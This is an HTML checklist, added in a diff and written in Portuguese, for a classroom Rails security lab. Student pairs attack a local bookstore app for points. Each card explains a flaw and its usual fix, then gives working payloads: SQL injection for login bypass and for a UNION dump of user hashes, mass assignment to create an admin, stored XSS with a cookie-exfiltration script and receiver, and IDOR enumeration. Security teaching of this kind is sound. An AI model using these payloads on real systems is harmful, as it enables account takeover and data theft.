@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>BookStore Attack Lab — Checklist</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10; --bg2: #0f1117; --bg3: #161b22;
+    --border: #21262d; --border2: #30363d;
+    --text: #e6edf3; --muted: #7d8590;
+    --red: #ff6b6b; --green: #3fb950; --blue: #58a6ff; --amber: #e3b341;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'DM Sans', sans-serif;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: var(--sans); padding: 2rem; max-width: 800px; margin: 0 auto; }
+
+  .header { border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 2rem; background: var(--bg2); position: relative; overflow: hidden; }
+  .header::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, var(--red), var(--amber)); }
+  .eyebrow { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-bottom: 8px; }
+  .title { font-size: 22px; font-weight: 500; margin-bottom: 6px; }
+  .subtitle { font-size: 13px; color: var(--muted); }
+  .meta-row { display: flex; gap: 1rem; margin-top: 1rem; flex-wrap: wrap; }
+  .meta { font-family: var(--mono); font-size: 11px; padding: 3px 10px; border-radius: 20px; border: 1px solid; }
+  .m-r { color: var(--red); border-color: rgba(255,107,107,0.3); background: rgba(255,107,107,0.08); }
+  .m-a { color: var(--amber); border-color: rgba(227,179,65,0.3); background: rgba(227,179,65,0.08); }
+  .m-g { color: var(--green); border-color: rgba(63,185,80,0.3); background: rgba(63,185,80,0.07); }
+
+  .dupla-box { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 1.25rem; margin-bottom: 2rem; display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .field-label { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-bottom: 8px; }
+  .field-input { border-bottom: 1px dashed var(--border2); height: 28px; }
+
+  .vuln-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; margin-bottom: 1rem; overflow: hidden; }
+  .vuln-head { padding: 1rem 1.25rem; border-bottom: 1px solid var(--border); display: flex; align-items: flex-start; justify-content: space-between; gap: 1rem; }
+  .vuln-num { font-family: var(--mono); font-size: 11px; color: var(--muted); background: var(--bg3); padding: 3px 8px; border-radius: 6px; border: 1px solid var(--border); flex-shrink: 0; }
+  .vuln-title { font-size: 15px; font-weight: 500; }
+  .vuln-owasp { font-family: var(--mono); font-size: 10px; padding: 2px 8px; border-radius: 20px; border: 1px solid rgba(255,107,107,0.3); color: var(--red); background: rgba(255,107,107,0.08); white-space: nowrap; }
+  .vuln-body { padding: 1.25rem; }
+  .vuln-target { font-family: var(--mono); font-size: 11px; color: var(--muted); margin-bottom: 12px; }
+  .vuln-target span { color: var(--blue); }
+
+  .payload-box { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 0.875rem 1rem; margin: 0.75rem 0; font-family: var(--mono); font-size: 12px; color: #c9d1d9; line-height: 1.55; overflow-x: auto; }
+  /* Linhas de código como blocos — sem <br> entre elas (evita “linha em branco”). */
+  .payload-box .payload-line { display: block; margin: 0; padding: 0; white-space: pre-wrap; word-break: break-word; }
+  .payload-box .payload-indent { display: block; padding-left: 1.25rem; margin: 0; white-space: pre-wrap; word-break: break-word; }
+  .payload-box .payload-spacer { margin-top: 0.45rem; }
+  .payload-label { font-family: var(--mono); font-size: 9px; color: var(--muted); margin-bottom: 6px; letter-spacing: 0.4px; }
+  .why-label { font-family: var(--mono); font-size: 9px; color: var(--muted); margin: 0 0 6px 0; letter-spacing: 0.35px; }
+  .why-box {
+    font-size: 13px;
+    color: #c9d1d9;
+    line-height: 1.55;
+    margin-bottom: 12px;
+    padding: 10px 12px;
+    border-left: 3px solid var(--blue);
+    background: rgba(88, 166, 255, 0.06);
+    border-radius: 0 8px 8px 0;
+  }
+  .why-box p { margin: 0 0 0.45rem 0; }
+  .why-box p:last-child { margin-bottom: 0; }
+  .c-comment { color: #6e7681; }
+  .c-cmd { color: var(--green); }
+  .c-str { color: #a5d6ff; }
+  .c-danger { color: var(--red); font-weight: 600; }
+
+  .evidence-box { border: 1px dashed var(--border2); border-radius: 8px; padding: 1rem; margin-top: 0.75rem; min-height: 80px; }
+  .evidence-label { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-bottom: 6px; }
+  .points { font-family: var(--mono); font-size: 11px; padding: 3px 10px; border-radius: 20px; border: 1px solid rgba(63,185,80,0.3); color: var(--green); background: rgba(63,185,80,0.07); }
+
+  .bonus-box { background: rgba(227,179,65,0.07); border: 1px solid rgba(227,179,65,0.25); border-radius: 10px; padding: 1.25rem; margin-top: 2rem; }
+  .bonus-title { font-family: var(--mono); font-size: 12px; color: var(--amber); margin-bottom: 0.75rem; }
+  .bonus-text { font-size: 13.5px; color: #c9982a; line-height: 1.6; }
+
+  .scoring { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .score-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-align: center; }
+  .score-pts { font-family: var(--mono); font-size: 22px; color: var(--green); font-weight: 600; }
+  .score-label { font-size: 12px; color: var(--muted); margin-top: 4px; }
+
+  @media print {
+    body { background: white; color: black; padding: 1rem; }
+    .payload-box { background: #f5f5f5; color: #333; border-color: #ccc; }
+    .why-box { background: #eef4fc; color: #222; border-color: #ccc; }
+    .vuln-card { border-color: #ccc; }
+    .header { border-color: #ccc; }
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="eyebrow">// encontro 01 · segurança rails · modo ataque</div>
+  <div class="title">BookStore Attack Lab</div>
+  <div class="subtitle">Checklist de vulnerabilidades — encontre o maior número de falhas</div>
+  <div class="meta-row">
+    <span class="meta m-r">45 minutos</span>
+    <span class="meta m-a">em duplas</span>
+    <span class="meta m-g">ranking ao vivo</span>
+  </div>
+</div>
+
+<div class="dupla-box">
+  <div>
+    <div class="field-label">// dupla — integrante 1</div>
+    <div class="field-input"></div>
+  </div>
+  <div>
+    <div class="field-label">// dupla — integrante 2</div>
+    <div class="field-input"></div>
+  </div>
+</div>
+
+<div class="scoring">
+  <div class="score-card">
+    <div class="score-pts">2 pts</div>
+    <div class="score-label">por vulnerabilidade<br>encontrada</div>
+  </div>
+  <div class="score-card">
+    <div class="score-pts">+1 pt</div>
+    <div class="score-label">exploração<br>criativa</div>
+  </div>
+  <div class="score-card">
+    <div class="score-pts">10 pts</div>
+    <div class="score-label">todas as 5<br>vulnerabilidades</div>
+  </div>
+</div>
+
+<div class="bonus-box" style="margin-bottom:2rem;background:rgba(88,166,255,0.06);border-color:rgba(88,166,255,0.25);">
+  <div class="bonus-title" style="color:var(--blue);">// antes de começar — preparação</div>
+  <div class="bonus-text" style="color:#8cb8ff;line-height:1.65;">
+    <div>Rode na raiz do projeto (uma vez): <span style="font-family:var(--mono);font-size:12px;">bin/rails db:prepare db:seed</span></div>
+    <div style="margin-top:0.5rem;">Credenciais de exemplo no seed: <strong>admin@bookstore.com</strong> / <strong>password123</strong> · <strong>alice@user.com</strong> / <strong>pass123</strong> · <strong>bob@user.com</strong> / <strong>pass123</strong></div>
+    <div style="margin-top:0.5rem;">O servidor deve estar em <span style="font-family:var(--mono);font-size:12px;">http://localhost:3000</span>. Após mudanças em models/controllers, reinicie o <span style="font-family:var(--mono);font-size:12px;">rails s</span> se algo parecer em cache.</div>
+  </div>
+</div>
+
+<!-- VULN 1 -->
+<div class="vuln-card">
+  <div class="vuln-head">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span class="vuln-num">01</span>
+        <span class="points">2 pts</span>
+      </div>
+      <div class="vuln-title">SQL Injection — Login</div>
+    </div>
+    <span class="vuln-owasp">A03 · Injection</span>
+  </div>
+  <div class="vuln-body">
+    <div class="vuln-target">alvo: <span>POST /login</span> · campo email</div>
+    <div class="why-label">// por que acontece</div>
+    <div class="why-box">
+      <p>O login monta SQL concatenando <strong>email</strong> e <strong>senha</strong> dentro da string da query (<code>WHERE … '#{email}' … '#{password}'</code>). Para o banco isso é texto SQL — não há separação entre “valor” e “comando”. Você injeta operadores (<code>OR</code>, aspas, etc.) e muda o significado do WHERE; com isso o aplicativo pode autenticar sem senha correta.</p>
+      <p style="font-size:12px;color:var(--muted);">Correção típica: <strong>consultas parametrizadas</strong> ou ORM só com binds; senha com <code>has_secure_password</code> / bcrypt fora do SQL.</p>
+    </div>
+    <div class="payload-label">// payload</div>
+    <div class="payload-box">
+<span class="c-comment payload-line"># Texto no campo email (fecha aspas + OR — senha ignorada):</span>
+<span class="c-danger payload-line">admin@bookstore.com') OR ('1'='1</span>
+<span class="c-comment payload-line payload-spacer"># Via curl (use --data-urlencode; "+-+ vira espaços, não é "--"):</span>
+<span class="payload-line"><span class="c-cmd">curl</span> -c cookies.txt -X POST http://localhost:3000/login \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"email=admin@bookstore.com') OR ('1'='1"</span> \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"password=x"</span></span>
+<span class="c-comment payload-line payload-spacer"># Sucesso: HTTP 302 para / (sessão como admin). SQLite + Rails em uma linha SQL:</span>
+<span class="c-comment payload-line"># o truque clássico com '--' pode gerar 500; este OR funciona no lab atual.</span>
+    </div>
+    <div class="evidence-label">// evidência (print ou log HTTP)</div>
+    <div class="evidence-box"></div>
+  </div>
+</div>
+
+<!-- VULN 2 -->
+<div class="vuln-card">
+  <div class="vuln-head">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span class="vuln-num">02</span>
+        <span class="points">2 pts</span>
+      </div>
+      <div class="vuln-title">Mass Assignment — Criar Admin</div>
+    </div>
+    <span class="vuln-owasp">A04 · Insecure Design</span>
+  </div>
+  <div class="vuln-body">
+    <div class="vuln-target">alvo: <span>POST /users</span> · campo role e credits</div>
+    <div class="why-label">// por que acontece</div>
+    <div class="why-box">
+      <p>O cadastro usa <strong><code>params[:user].permit!</code></strong>, que libera <em>todos</em> os atributos permitidos pelo mass assignment. Campos extras no POST (<code>role</code>, <code>credits</code>) são aplicados ao model como qualquer outro — não há lista explícita “só nome, email e senha”.</p>
+      <p style="font-size:12px;color:var(--muted);">Correção típica: <strong>strong parameters</strong> — <code>params.require(:user).permit(:name, :email, :password)</code> — sem <code>role</code>/<code>credits</code>.</p>
+    </div>
+    <div class="payload-label">// payload</div>
+    <div class="payload-box">
+<span class="c-comment payload-line"># Email único a cada execução (evita 422 por uniqueness em h@evil.com)</span>
+<span class="payload-line">LAB_EMAIL=<span class="c-str">"h-$(date +%s)@evil.com"</span></span>
+<span class="payload-line"><span class="c-cmd">curl</span> -X POST http://localhost:3000/users \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"user[name]=Hacker"</span> \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"user[email]=$LAB_EMAIL"</span> \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"user[password]=123"</span> \</span>
+<span class="payload-indent">--data-urlencode <span class="c-danger">"user[role]=admin"</span> \</span>
+<span class="payload-indent">--data-urlencode <span class="c-danger">"user[credits]=999999"</span></span>
+<span class="c-comment payload-line payload-spacer"># Verificar no rails console (usuário mais recente == o que você acabou de criar):</span>
+<span class="payload-line">User.order(<span class="c-str">created_at: :desc</span>).first.role</span>
+<span class="c-comment payload-line"># => "admin"  ← sucesso! credits deve ser 999999 também.</span>
+    </div>
+    <div class="evidence-label">// evidência (output do console ou print)</div>
+    <div class="evidence-box"></div>
+  </div>
+</div>
+
+<!-- VULN 3 -->
+<div class="vuln-card">
+  <div class="vuln-head">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span class="vuln-num">03</span>
+        <span class="points">2 pts</span>
+      </div>
+      <div class="vuln-title">XSS Stored — Comentários</div>
+    </div>
+    <span class="vuln-owasp">A03 · Injection</span>
+  </div>
+  <div class="vuln-body">
+    <div class="vuln-target">alvo: <span>POST /books/:id/comments</span> · campo body</div>
+    <div class="why-label">// por que acontece</div>
+    <div class="why-box">
+      <p>O comentário é salvo no banco sem sanitização e a página renderiza com <strong><code>raw(comment.body)</code></strong>. O ERB padrão escapa HTML (<code>&lt;</code> vira texto); <code>raw</code> desliga esse escape. O navegador então processa tags como <code>&lt;script&gt;</code> como código — XSS persistente para todo visitante da página.</p>
+      <p style="font-size:12px;color:var(--muted);">Correção típica: não usar <code>raw</code> em dado de usuário; sanitizar com lista branca ou só texto escapado. Cookie de sessão com <strong>HttpOnly</strong> limita roubo via <code>document.cookie</code>, mas não elimina o XSS.</p>
+    </div>
+    <div class="payload-label">// payload no campo de comentário</div>
+    <div class="payload-box">
+<span class="c-comment payload-line">&lt;!-- Cole no formulário de comentário: --&gt;</span>
+<span class="c-danger payload-line">&lt;script&gt;alert('XSS — cookie: ' + document.cookie)&lt;/script&gt;</span>
+<span class="c-comment payload-line payload-spacer"># Por que document.cookie pode vir vazio? O Rails guarda a sessão em cookie HttpOnly</span>
+<span class="c-comment payload-line"># — o navegador envia o cookie nas requisições, mas JS não pode ler (defesa real).</span>
+<span class="c-comment payload-line"># O XSS continua válido (execução arbitrária); o roubo da sessão por document.cookie falha.</span>
+<span class="c-comment payload-line payload-spacer">&lt;!-- Variante com roubo de cookie (só vê cookies sem HttpOnly): --&gt;</span>
+<span class="c-danger payload-line">&lt;script&gt;new Image().src='http://localhost:9999/?c='+document.cookie&lt;/script&gt;</span>
+<span class="c-comment payload-line payload-spacer"># Receptor (em outro terminal):</span>
+<span class="payload-line"><span class="c-cmd">python3 -m http.server</span> 9999</span>
+    </div>
+    <div class="evidence-label">// evidência (print do alert ou log do receptor)</div>
+    <div class="evidence-box"></div>
+  </div>
+</div>
+
+<!-- VULN 4 -->
+<div class="vuln-card">
+  <div class="vuln-head">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span class="vuln-num">04</span>
+        <span class="points">2 pts</span>
+      </div>
+      <div class="vuln-title">IDOR — Pedidos de outros usuários</div>
+    </div>
+    <span class="vuln-owasp">A01 · Broken Access Control</span>
+  </div>
+  <div class="vuln-body">
+    <div class="vuln-target">alvo: <span>GET /orders/:id</span> · ID de outro usuário</div>
+    <div class="why-label">// por que acontece</div>
+    <div class="why-box">
+      <p>O detalhe do pedido faz <strong><code>Order.find(params[:id])</code></strong>: qualquer ID existente é carregado. Não há verificação de que <code>order.user_id == current_user.id</code> (nem equivalente em policy). Quem está logado só precisa adivinhar/enumerar IDs — referência direta a objeto sem autorização por dono.</p>
+      <p style="font-size:12px;color:var(--muted);">Correção típica: <strong><code>current_user.orders.find(params[:id])</code></strong> ou autorização explícita antes de expor o registro.</p>
+    </div>
+    <div class="payload-label">// payload — iterar IDs</div>
+    <div class="payload-box">
+<span class="c-comment payload-line"># Obter sessão da Alice (precisa de db:seed):</span>
+<span class="payload-line"><span class="c-cmd">curl</span> -c alice_cookies.txt -X POST http://localhost:3000/login \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"email=alice@user.com"</span> \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"password=pass123"</span></span>
+<span class="c-comment payload-line payload-spacer"># Logada como alice, enumerar pedidos (Bob tem pedido no seed):</span>
+<span class="payload-line"><span class="c-cmd">for</span> i <span class="c-cmd">in</span> 1 2 3 4<span class="c-cmd">;</span> <span class="c-cmd">do</span></span>
+<span class="payload-indent">echo "=== /orders/$i ==="</span>
+<span class="payload-indent"><span class="c-cmd">curl</span> -s -b alice_cookies.txt http://localhost:3000/orders/$i | grep -Eo '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}'</span>
+<span class="payload-line"><span class="c-cmd">done</span></span>
+<span class="c-comment payload-line payload-spacer"># Sucesso: aparece bob@user.com (pedido de outro usuário)</span>
+    </div>
+    <div class="evidence-label">// evidência (email ou dados de outro usuário visíveis)</div>
+    <div class="evidence-box"></div>
+  </div>
+</div>
+
+<!-- VULN 5 -->
+<div class="vuln-card">
+  <div class="vuln-head">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span class="vuln-num">05</span>
+        <span class="points">2 pts</span>
+      </div>
+      <div class="vuln-title">SQL Injection — Campo de busca</div>
+    </div>
+    <span class="vuln-owasp">A03 · Injection</span>
+  </div>
+  <div class="vuln-body">
+    <div class="vuln-target">alvo: <span>GET /search?q=</span> · UNION-based dump</div>
+    <div class="why-label">// por que acontece</div>
+    <div class="why-box">
+      <p>O parâmetro <strong><code>q</code></strong> é interpolado dentro da SQL (<code>WHERE title = '…' OR author = '…'</code> via string Ruby). Assim como no login, entrada do usuário vira parte do programa SQL: um <strong>UNION</strong> acrescenta linhas de outra tabela desde que o número/tipos de colunas batam com o primeiro <code>SELECT</code> — aqui, com as colunas de <code>books</code>.</p>
+      <p style="font-size:12px;color:var(--muted);">Correção típica: binds (<code>?</code>) ou hashes do ActiveRecord; nunca interpolar <code>params</code> em fragmento SQL cru.</p>
+    </div>
+    <div class="payload-label">// payload — dump de usuários via UNION (9 colunas = tabela books)</div>
+    <div class="payload-box">
+<span class="c-comment payload-line"># Busca vulnerável usa igualdade em title/autor; UNION no nível do SELECT.</span>
+<span class="payload-line"><span class="c-cmd">curl</span> --get http://localhost:3000/search \</span>
+<span class="payload-indent">--data-urlencode <span class="c-str">"q=<span class="c-danger">' UNION SELECT id,email,password_digest,name,1.0,role,credits,datetime('now'),datetime('now') FROM users -- </span>"</span></span>
+<span class="c-comment payload-line payload-spacer"># Sucesso: emails (no “título” do card) e valores da conta misturados ao catálogo</span>
+<span class="c-comment payload-line"># Login opcional para outras demos: curl -c cookies.txt -X POST ... /login ...</span>
+    </div>
+    <div class="evidence-label">// evidência (emails ou hashes visíveis na resposta)</div>
+    <div class="evidence-box"></div>
+  </div>
+</div>
+
+<div class="bonus-box">
+  <div class="bonus-title">// bônus — red team oficial</div>
+  <div class="bonus-text">
+    <p style="margin:0 0 0.55rem 0;">A dupla que encontrar <strong>todas as 5 vulnerabilidades</strong> com evidência se torna o <strong>red team oficial</strong> da turma —
+    nos encontros seguintes, vocês serão os atacantes nas validações ao vivo dos labs de defesa.</p>
+    <p style="margin:0;">Exploração extra conta +1 ponto: XSS que redireciona a página, IDOR que itera todos os pedidos automaticamente, ou dump completo via SQLi são exemplos de exploração criativa.</p>
+  </div>
+</div>
+
+</body>
+</html>
